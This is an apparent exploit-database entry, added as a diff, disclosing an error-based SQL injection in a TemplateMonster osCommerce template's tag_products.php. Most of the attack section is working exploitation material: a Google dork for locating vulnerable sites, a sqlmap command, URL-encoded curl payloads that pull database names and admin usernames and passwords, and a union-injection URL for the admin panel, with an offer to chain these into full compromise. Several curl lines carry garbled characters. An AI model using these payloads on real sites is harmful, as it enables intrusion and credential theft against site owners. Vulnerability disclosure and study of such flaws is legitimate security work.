@@ -1,0 +1,72 @@
+id: 27709
+date: 05/03/2017
+title: osCommerce Error-based SQL Injection Vulnerability
+author: Project Insecurity
+cves: 
+
+[+]---------------------------------------------------------[+]
+        | Vulnerable Software:      TemplateMonster osCommerce      |
+        | Vendor:                   http://templatemonster.org      |
+        | Vulnerability Type:       Error-based SQL Injection       |
+        | Date Released:            23/04/2017                      |
+        | Released by:              Project Insecurity (@insecurity)|
+       [+]---------------------------------------------------------[+]
+
+TemplateMonster is a site that makes templates for various content management systems. There are severe SQL injection
+issues in their template for popular CMS 'osCommerce' - this can lead to a complete system compromise of any site using this
+template. Estimated around 70k-100k vulnerable sites although not that many are indexed on google. 
+
+This source apears to be a developer from templatemonster releasing source code publicly instead of forcing users to pay for it. 
+The source is vulnerable to SQL INJECTION in the tag_products.php file:  
+
+https://github.com/templatemonster/oscommerce/blob/master/theme/tag_products.php 
+The code for this file can be seen below:
+------------------------------------------------------------------------------------------------------------- 
+ $tag_id= $HTTP_GET_VARS['id_tag'];  
+  $tag_text=""; 
+  $tags_query = tep_db_query("select * from ". TABLE_TAGS ." where tag_id='". $tag_id ."'"); 
+  while ($tags_result = tep_db_fetch_array($tags_query)) { 
+    $tag_text = urldecode($tags_result['tag_text']); 
+  } 
+------------------------------------------------------------------------------------------------------------- 
+As you can see above, it does not escape the SQL statement and accepts any value for the id_tag GET param
+
+Basic PoC of how exploitation would take place using SQLMap + cURL (and html2text for sorting):
+-------------------------------------------------------------------------------------------------------------
+#OsCommerce TemplateMonster ERROR BASED SQL Injection Vulnerability Checker & Exploiter 
+#Google Dork: inurl:tag_products inurl:id_tag -github 
+#Sqlmap Command: python sqlmap.py -u http://localhost/tag_products.php?id_tag=6  --dbms=MYSQL --random-agent --level=5 --risk=3  --threads=10 --test-filter=FLOOR 
+#Requirements: curl, html2text, grep, head 
+#curl -s http://localhost/tag_products.php?id_tag=9%20%20AND%20%28SELECT%206354%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28%28SELECT%20%28ELT%286354%3D6354%2C1%29%29%29%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.plugins%20GROUP%20BY%20x%29a%29 |grep "<font"|html2text|head -n1 
+-------------------------------------------------------------------------------------------------------------  
+#Get results in clear form 
+#|grep "<font"|html2text|head -n1| cut -d"'" -f2| rev | cut -c 2- | rev 
+#Change Limit 1,1 to Limit 2,1 etc to find database names 
+#curl AC/a!as http://localhost/tag_products.php?id_tag= 6%20AND%20%28SELECT%205140%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28%28SELECT%20MID%28%28IFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C54%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%201%2C1%29%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20%0A |grep "<font"|html2text|head AC/a!an1|cut AC/a!ad"'" -f2|rev |cut AC/a!ac 2-|rev 
+------------------------------------------------------------------------------------------------------------- 
+#Current Database 
+#curl AC/a!as http://localhost:80/tag_products.php?id_tag=6%20AND%20%28SELECT%207847%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C54%29%29%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29|grep "<font"|html2text|head AC/a!an1|cut AC/a!ad"'" -f2|rev |cut AC/a!ac 2-|rev 
+-------------------------------------------------------------------------------------------------------------
+#Admin Password change CURRENT_DATABASE to database found in previous request 
+# curl AC/a!as http://localhost/tag_products.php?id_tag=6%20AND%20%28SELECT%204796%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28%28SELECT%20MID%28%28IFNULL%28CAST%28user_password%20AS%20CHAR%29%2C0x20%29%29%2C1%2C54%29%20FROM%20%24CURRENT_DATABASE.administrators%20ORDER%20BY%20user_password%20LIMIT%200%2C1%29%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29|grep "<font"|html2text|head AC/a!an1|cut AC/a!ad"'" -f2|rev |cut AC/a!ac 2-|rev 
+------------------------------------------------------------------------------------------------------------- 
+#Admin User_Name change CURRENT_DATABASE to database found in request beforehand 
+#  curl AC/a!as http://localhost/tag_products.php?id_tag=6%20AND%20%28SELECT%204796%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28%28SELECT%20MID%28%28IFNULL%28CAST%28user_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C54%29%20FROM%20%24CURRENT_DATABASE.administrators%20ORDER%20BY%20user_password%20LIMIT%200%2C1%29%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29|grep "<font"|html2text|head AC/a!an1|cut AC/a!ad"'" -f2|rev |cut AC/a!ac 2-|rev 
+------------------------------------------------------------------------------------------------------------- 
+
+Public Vulnerability that can be used in conjunction to this exploit: 
+https://www.exploit-db.com/exploits/31515/ 
+
+Once the credentials have been stolen and an attacker has logged into the admin panel they can run union based SQL injection queries
+and thus be able to steal the database faster and be able to read files and/or input into files causing complete system compromise. 
+
+ http://[HOST]/admin/geo_zones.php?action=list&zID=1 group by 1 union select 1,2,3,4,5,6,7,concat(user_name,0x3a,user_password) from administrators --
+
+Btw, we will write an actual PoC for this that can be ran as a python or bash script if any of you guys are interested :)
+For both of these exploits (0day + public vuln) used in conjunction with eacohter. Let us know if there's any appeal for that.
+------------------------------------------------------------------------------------------------------------- 
+
+How to fix: properly escape SQL queries / sanatize user inputs.. no response from vendor after months and months of effort. Despite
+            MANY websites being vulnerable. Some vuln site admins contacted, seemed panicked (and rightfully so)
+
+#  0day.today [2023-03-23]  #
